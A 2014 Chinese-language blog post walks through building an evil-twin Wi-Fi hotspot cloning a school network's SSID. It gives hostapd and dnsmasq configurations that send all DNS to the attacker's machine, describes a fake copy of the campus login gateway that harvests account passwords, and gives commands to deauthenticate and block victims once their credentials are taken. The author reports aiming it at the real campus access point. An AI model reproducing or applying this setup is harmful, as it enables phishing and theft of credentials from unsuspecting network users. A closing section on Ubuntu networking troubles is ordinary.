title:WIFI 热点欺骗
Date: 2014-11-23 15:21
Modified: 2014-11-23 15:21
Category: web
Tags: WIFI, Linux
Slug: real-attack-show-wifi-vulnerability
Authors: nullne
Summary:
_很久以前看过一篇关于WIFI脆弱性的[介绍](http://fex.baidu.com/blog/2014/04/traffic-hijack/)(找了好久终于被我找到了)，其中有一部分讲的是由于本身协议的弱点，相同 ssid 的热点会被合并为同一个，至于用户最终连接哪个热点取决于他所能接收到的信号强度。不知道此刻各位看官脑洞有没有大开？_
_俗话说杀生不如宰熟，所以直接就向学校 ap 下手了。提前声明几个全局变量：_

```
ssid: NICESHOT
os： ubuntu
```


###简单部署
####用 hostapd 建立热点
>“**hostapd** is a user space daemon for access point and authentication servers. “

```
sudo apt-get install hostapd
```
更改配置文件 _/etc/hostapd-hotspot.conf_ 如下：
```
# WiFi Hotspot
interface=wlan0
driver=nl80211
#Access Point
ssid=NICESHOT
hw_mode=g
# WiFi Channel:
channel=1
#macaddr_acl=0
auth_algs=1
wmm_enabled=0
#ignore_broadcast_ssid=0
#wpa=3
#wpa_passphrase=1
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP
#rsn_pairwise=CCMP
ctrl_interface=/var/run/hostapd
```
可能还需要更改 _/etc/default/hostapd_ 为
```
DAEMON_CONF=/etc/hostapd/hostapd.conf
```
然后测试配置文件`hostapd -d /etc/hostapd-hotspot.conf`,  没有什么问题的话就可以启动服务了
```
service hostapd start
```
####微型 DNCP & DNS -- dnsmasq
>Dnsmasq is a free software DNS forwarder and DHCP server for small networks. It is considered to be easily configured, with low system resource usage.

```
sudo apt-get install dnsmasq
```
更改配置文件 _/etc/dnsmasq.conf_
```
log-facility=/var/log/dnsmasq.log
address=/#/192.168.1.1
interface=wlan0                                                                             
dhcp-range=192.168.1.20,192.168.1.254,12h
no-resolv 
```
然后比较关键的是配置 **wlan0** IP 地址 `ifconfig wlan0 192.168.1.1`。
稍微总结一下，到此为止，我们做了这么些事情：创建 WFIFI 热点，监听 **wlan0** 口，然后通过配置DHCP给所有连接到此 AP 的终端分配IP地址。另外上面的这条配置`address=/#/192.168.1.1`，将所有地址解析到我们的电脑 IP。
####搭建服务器
此处就不详说了，最终达到的效果是访问 `192.168.1.1`是我们的钓鱼网站。
因为校园网需要登陆，也就是说连接校园 AP 之后将所有 HTTP 页面跳转到网关登陆界面。所以我们也部署一个一模一样的登陆网关，然后所有连接的用户跟往常一样登陆网关，神不知鬼不觉得就把账号密码泄露过来了。稍后我会分享此处的简单代码 DEMO 到 GitHub。
###进阶
当然不能停止在这么简陋的东西上面，我们需要更进一步。
####粗暴的强制下线
毕竟我们只有一个无线网卡，用作 AP 之后就不能接入其他网络了，环境也不允许拉一根网线，用户登录网关之后根本没办法继续上网，很快你的伪 AP 就会被发现。所以我们强制所有登录网关，也就是被我们窃取密码的用户离线。
```
hostapd_cli deauthenticate 38:bc:1a:88:12:61                                                     
iptables -A INPUT -m mac --mac-source 38:bc:1a:88:12:61 -j DROP
```
第一句强制用户离线，之前在配置 hostapd 的时，这句就是为了达到这个目的 `ctrl_interface=/var/run/hostapd`，第二句将所有该设备的请求丢弃。这就是当一个人丧失所有利用价值之后的下场！
####配置更为合理的 iptables（还没有实现）
当然，前提是我们自己的电脑还可以通过其他口，比如 _eth0_，访问正常网络。
通过配置合理强大的 **iptables**,精心布局，我们不仅仅获取网关密码这么简单的并且还需要特别严格苛刻的场景的蛋糕。拭目以待。。。
###思考
###后记
####伤敌一百，自损三千
因为自己的装备跟技术很挫，在配置之前那些东西的时候碰到了一些问题，险些出师未捷身先死。
在 ubuntu 下，`service networking restart`,然后你就各种问题爽翻天
- 现在，至少目前为止插上网线之后还需要 `ifup eth0` 才能通过有线上网
- 现在，至少目前为止我连接 WIFI 的时候需要这么做（运气好的话差不多能连接上）
```
ifup wlan0   #up the wlan port 
iwlist wlan0 scan #list availabel wifi ssid
iwconfig wlan0 essid "NICESHOT"  #no password
iwconfig wlan0 ssid "NICESHOT" key password   #with password
dhcpclient wlan0   #get ip via dhcp 
```
- 电脑里面出现了奇怪的端口:wlan0:avahi
- 系统自带的 network-manager 罢工了
- 其他未知错误待续
